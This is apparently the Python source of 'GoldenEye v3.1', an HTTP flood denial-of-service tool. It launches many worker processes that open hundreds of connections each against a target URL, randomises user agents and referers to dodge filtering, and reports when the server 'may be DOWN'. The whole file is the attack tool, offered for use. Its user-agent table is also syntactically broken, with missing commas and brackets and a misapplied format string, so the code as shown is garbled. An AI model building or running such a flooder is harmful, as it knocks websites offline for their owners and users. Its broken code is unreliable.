from multiprocessing import Process, Manager
import urllib.parse, ssl
import sys, getopt, random, time, os
import http.client
import logging
from webbrowser import Chrome

HTTPCLIENT = http.client

# Config
DEBUG = False
SSLVERIFY = True

# Constants
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0

DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 500

GOLDENEYE_BANNER = 'GoldenEye v3.1 by K.MEGHADITYA <meggha2013@gmail.com>'

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT 6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
        },
    },
    
    'platform': {
        
   'chrome': {
    'win_64': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/108.0.0.0 Safari/537.36'
        'name': ['AppleWebKit/537.36'% (random.randint(100, 110), random.randint(0, 9999), random.randint(0, 999)) for i in range(1, 30)]
        'details': ['KHTML, like Gecko'],
        'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)] +
                          ['Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]

        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)] +
                          ['Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6)] +
                            ['.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12), random.randint(10, 25)) for i in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}

# Configure logging
logging.basicConfig(level=logging.DEBUG if DEBUG else logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# GoldenEye Class
class GoldenEye:

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):
        self.url = url
        self.manager = Manager()
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        logging.info("Shutting down GoldenEye")

    def __del__(self):
        self.exit()

    def printHeader(self):
        print()
        print(GOLDENEYE_BANNER)
        print()

    def fire(self):
        self.printHeader()
        logging.info("Hitting webserver in mode '%s' with %d workers running %d connections each. Hit CTRL+C to cancel.", self.method, self.nr_workers, self.nr_sockets)

        if DEBUG:
            logging.debug("Starting %d concurrent workers", self.nr_workers)

        for i in range(int(self.nr_workers)):
            try:
                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except Exception as e:
                logging.error("Failed to start worker %d: %s", i, str(e))

        if DEBUG:
            logging.debug("Initiating monitor")
        self.monitor()

    def stats(self):
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                logging.info("%d GoldenEye strikes hit. (%d Failed)", self.counter[0], self.counter[1])

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    logging.warning("Server may be DOWN!")

                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except Exception as e:
            logging.error("Error in stats: %s", str(e))

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                logging.info("CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            logging.debug("Killing worker %s", worker.name)
                        worker.stop()
                    except Exception as e:
                        logging.error("Error stopping worker %s: %s", worker.name, str(e))
                if DEBUG:
                    raise
                else:
                    pass

# Striker Class
class Striker(Process):

    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):
        super().__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urllib.parse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path
        self.port = parsedUrl.port if parsedUrl.port else (443 if self.ssl else 80)

        self.referers = [
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.DuckDuckGo.com/',
            'http://www.yahoo.com/',
            'http://' + self.host + '/'
        ]

    def __del__(self):
        self.stop()

    def buildblock(self, size):
        return ''.join(chr(random.choice(range(48, 123))) for _ in range(size))

    def run(self):
        if DEBUG:
            logging.debug("Starting worker %s", self.name)

        while self.runnable:
            try:
                for i in range(self.nr_socks):
                    if self.ssl:
                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context() if not SSLVERIFY else None)
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
                    self.socks.append(c)

                for conn_req in self.socks:
                    url, headers = self.createPayload()
                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:
                    conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()

            except Exception as e:
                self.incFailed()
                logging.error("Exception in worker %s: %s", self.name, str(e))
                if DEBUG:
                    raise

        if DEBUG:
            logging.debug("Worker %s completed run. Godnight :)", self.name)

    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except Exception as e:
                logging.error("Error closing connection: %s", str(e))

    def createPayload(self):
        req_url, headers = self.url, {}

        headers['User-Agent'] = self.randomUserAgent()
        headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        headers['Accept-Language'] = 'en-US,en;q=0.5'
        headers['Connection'] = 'keep-alive'
        headers['Referer'] = random.choice(self.referers)
        headers['Accept-Encoding'] = 'gzip, deflate, br'

        return req_url, headers

    def randomUserAgent(self):
        os_type = random.choice(list(USER_AGENT_PARTS['os'].keys()))
        platform_type = random.choice(list(USER_AGENT_PARTS['platform'].keys()))

        useragent = ' '.join([
            'Mozilla/5.0',
            USER_AGENT_PARTS['os'][os_type]['name'][random.randint(0, len(USER_AGENT_PARTS['os'][os_type]['name']) - 1)],
            USER_AGENT_PARTS['os'][os_type]['ext'][random.randint(0, len(USER_AGENT_PARTS['os'][os_type]['ext']) - 1)],
            'AppleWebKit/%s (KHTML, like Gecko)' % random.choice(USER_AGENT_PARTS['platform']['webkit']['name']),
            random.choice(USER_AGENT_PARTS['platform'][platform_type]['extensions'])
        ])

        return useragent

    def stop(self):
        self.runnable = False

    def incCounter(self):
        self.request_count += 1
        self.counter[0] += 1

    def incFailed(self):
        self.failed_count += 1
        self.counter[1] += 1

# Main Function
def main(argv):
    try:
        opts, args = getopt.getopt(argv, 'u:w:s:m:h', ['url=', 'workers=', 'sockets=', 'method=', 'help'])
    except getopt.GetoptError:
        print('Usage: goldeneye.py -u <url> [-w <workers>] [-s <sockets>] [-m <method>]')
        sys.exit(2)

    url = None
    workers = DEFAULT_WORKERS
    sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            print('Usage: goldeneye.py -u <url> [-w <workers>] [-s <sockets>] [-m <method>]')
            print('if needed more help contact meggha2013@gmail.com ')
            sys.exit()
        elif opt in ('-u', '--url'):
            url = arg
        elif opt in ('-w', '--workers'):
            workers = int(arg)
        elif opt in ('-s', '--sockets'):
            sockets = int(arg)
        elif opt in ('-m', '--method'):
            method = arg.lower()

    if url is None:
        print('URL is required')
        sys.exit(2)

    ge = GoldenEye(url)
    ge.nr_workers = workers
    ge.nr_sockets = sockets
    ge.method = method
    ge.fire()

if __name__ == "__main__":
    main(sys.argv[1:])
